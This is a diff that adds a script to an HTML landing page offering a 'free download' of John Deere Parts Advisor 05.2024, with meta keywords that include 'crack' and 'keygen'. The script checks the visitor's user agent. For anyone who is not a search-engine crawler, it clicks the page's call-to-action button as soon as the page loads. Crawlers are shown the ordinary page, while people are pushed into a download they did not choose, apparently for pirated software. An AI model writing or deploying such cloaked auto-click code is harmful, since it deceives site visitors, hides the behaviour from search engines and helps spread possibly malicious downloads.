@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>John Deere Parts Advisor 05.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Get John Deere Parts Advisor 05.2024 for all regions, supporting multiple languages and operating systems. Download now for spare parts catalog.">
     <meta name="keywords" content="John Deere Parts Advisor, John Deere Parts Advisor 2024, John Deere Parts Advisor 05.2024, John Deere Parts Advisor free download, John Deere Parts Advisor 2024 download, John Deere Parts Advisor catalog, John Deere Parts Advisor 05.2024 download, John Deere spare parts catalog, John Deere parts 2024, John Deere Parts Advisor deutsch, John Deere Parts Advisor spanish, John Deere Parts Advisor francais, John Deere Parts Advisor italiano, John Deere Parts Advisor portuguese, John Deere Parts Advisor chinese, John Deere catalog free download, John Deere parts advisor keygen, John Deere Parts Advisor crack, John Deere agriculture parts, John Deere construction parts, John Deere power systems parts, John Deere forestry parts, John Deere parts advisor high speed download">
     <style>
